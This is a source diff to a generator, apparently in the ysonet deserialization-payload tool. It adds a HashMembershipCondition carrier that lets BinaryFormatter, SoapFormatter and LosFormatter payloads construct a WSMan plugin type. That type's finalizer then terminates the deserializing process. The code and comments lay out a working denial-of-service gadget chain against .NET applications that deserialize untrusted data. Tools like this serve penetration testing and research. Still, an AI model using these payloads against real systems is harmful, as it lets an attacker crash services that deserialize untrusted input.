@@ -1,6 +1,8 @@
 using NDesk.Options;
 using System;
 using System.Collections.Generic;
+using System.Runtime.Serialization;
+using System.Security.Policy;
 using ysonet.Helpers;
 
 namespace ysonet.Generators
@@ -65,10 +67,11 @@ namespace ysonet.Generators
      * this gadget makes no claim about. Hence GadgetRequirement.ExtraAssembly and a runtime
      * version axis deliberately left unspecified - the gate is a library, not a build.
      *
-     * WHY EVERY PAYLOAD IS HAND WRITTEN. Constructing the target inside ysonet would arm the
-     * exact finalizer that kills a process, and ysonet is the process. No branch below ever
-     * creates one; the two type-swap formats serialize the empty surrogate at the bottom of
-     * this file and rewrite the type name in the finished bytes instead.
+     * WHY NO PAYLOAD CONSTRUCTS THE TARGET. Constructing the target inside ysonet would arm
+     * the exact finalizer that kills a process, and ysonet is the process. The document
+     * formats are hand written, the two type-swap formats serialize the empty surrogate at
+     * the bottom of this file, and the three runtime formatters serialize a harmless marshal
+     * whose SerializationInfo names HashMembershipCondition. No branch creates the target.
      *
      * -t IS ISOLATED, NOT REFUSED. The self-test runs in a CHILD ysonet process
      * (SelfTestNeedsChildProcess -> Helpers/Core/IsolatedSelfTest): the child gets the exact
@@ -160,12 +163,11 @@ namespace ysonet.Generators
             return new List<string> { GadgetTags.Independent };
         }
 
-        // The widest formatter list in this catalogue, and the reason is the payload's shape
-        // rather than anything clever: "construct this type and set nothing" is the one thing
-        // almost every serializer can express. There is no member to place, no constructor
-        // argument to smuggle and no property order to get right - only a type name - so the
-        // usual dividing line (does this serializer drive an ISerializable constructor, or set
-        // properties by name?) does not apply here at all.
+        // The widest formatter list in this catalogue. Most entries directly express
+        // "construct this type and set nothing". BinaryFormatter, SoapFormatter and
+        // LosFormatter cannot do that because ObjectReader rejects the non-[Serializable]
+        // target before construction, so those three use the serializable
+        // HashMembershipCondition carrier at the bottom of this file instead.
         //
         // Every entry below was proven by generating the payload and watching a CHILD ysonet
         // process die with
@@ -173,16 +175,17 @@ namespace ysonet.Generators
         //   Handle is not initialized.
         // which is the target's own finalizer, not merely "the document parsed".
         //
-        // FOUR FORMATS ARE OUT, and each one is a measured or structural fact, not an
-        // unexplored cell:
+        // The runtime carrier works because HashMembershipCondition's serialization
+        // constructor passes its HashAlgorithm string to HashAlgorithm.Create. On .NET
+        // Framework that reaches CryptoConfig.CreateFromName, which resolves an
+        // assembly-qualified type and invokes its public parameterless constructor before it
+        // casts the result to HashAlgorithm. The fixed WSMan type is constructed; the cast
+        // then fails, but the inherited finalizer remains registered and fires later. The
+        // HashValue member is present only to satisfy the carrier's serialization contract.
         //
-        //  - BinaryFormatter, SoapFormatter, LosFormatter: IMPOSSIBLE. All three read through
-        //    mscorlib's ObjectReader, which calls CheckSerializable BEFORE it creates
-        //    anything - "if (!t.IsSerializable && !HasSurrogate(t)) throw new
-        //    SerializationException(Serialization_NonSerType)". The target carries no
-        //    [Serializable] attribute, so they refuse the TYPE and no document shape can get
-        //    past it. Locked by WSManPluginInstanceCannotUseTheRuntimeFormatters.
-        //  - FsPickler: IMPOSSIBLE, for its own separate reason, and only the INNERMOST
+        // ONE FORMAT IS OUT, as a measured structural fact rather than an unexplored cell:
+        //
+        //  - FsPickler: IMPOSSIBLE, and only the INNERMOST
         //    exception says so - the outer one is the useless "Error deserializing object of
         //    type 'System.Object'". FsPickler refuses the type during pickler resolution:
         //    "NonSerializableTypeException: Type
@@ -201,6 +204,9 @@ namespace ysonet.Generators
         {
             return new List<string>
             {
+                Formatters.BinaryFormatter,
+                Formatters.SoapFormatter,
+                Formatters.LosFormatter,
                 Formatters.JsonNet,
                 Formatters.Xaml,
                 Formatters.FastJson,
@@ -289,6 +295,10 @@ namespace ysonet.Generators
                     + ": a child ysonet process is about to be terminated on purpose. "
                     + "This process is not affected.");
 
+            if (UsesHashMembershipConditionCarrier(formatter))
+                return Serialize(new HashMembershipConditionMarshal(TargetTypeName()),
+                    formatter, inputArgs);
+
             return FinishHandWrittenPayload(BuildPayload(formatter), formatter, inputArgs,
                 SelfTestRootType(formatter, inputArgs));
         }
@@ -306,6 +316,13 @@ namespace ysonet.Generators
         private string TargetTypeNameNoSpaces()
         {
             return TargetTypeName().Replace(", ", ",");
+        }
+
+        private static bool UsesHashMembershipConditionCarrier(string formatter)
+        {
+            return IsFormatter(formatter, Formatters.BinaryFormatter)
+                || IsFormatter(formatter, Formatters.SoapFormatter)
+                || IsFormatter(formatter, Formatters.LosFormatter);
         }
 
         // Every document below says the same thing: "make one of these, set nothing". The type
@@ -461,6 +478,34 @@ namespace ysonet.Generators
         // MessagePackTypelessTypeSwap rewrite the type name before the payload leaves ysonet.
         internal sealed class WSManPluginInstanceSurrogate
         {
+        }
+
+        // BinaryFormatter, SoapFormatter and LosFormatter cannot instantiate the real target
+        // as their root because it is not [Serializable]. This harmless object serializes AS
+        // System.Security.Policy.HashMembershipCondition instead. The target-side
+        // serialization constructor reads HashValue, then passes HashAlgorithm to
+        // HashAlgorithm.Create/CryptoConfig.CreateFromName. CryptoConfig constructs the fixed
+        // WSMan type through its public zero-argument constructor before the cast to
+        // HashAlgorithm fails. That failure leaves the constructed object's finalizer armed.
+        //
+        // Keep the complete graph here beside the gadget: both member names and the target
+        // name are payload material, and none of it belongs in a shared helper.
+        [Serializable]
+        internal sealed class HashMembershipConditionMarshal : ISerializable
+        {
+            private readonly string targetTypeName;
+
+            internal HashMembershipConditionMarshal(string targetTypeName)
+            {
+                this.targetTypeName = targetTypeName;
+            }
+
+            public void GetObjectData(SerializationInfo info, StreamingContext context)
+            {
+                info.SetType(typeof(HashMembershipCondition));
+                info.AddValue("HashValue", new byte[] { 0 }, typeof(byte[]));
+                info.AddValue("HashAlgorithm", targetTypeName, typeof(string));
+            }
         }
     }
 }
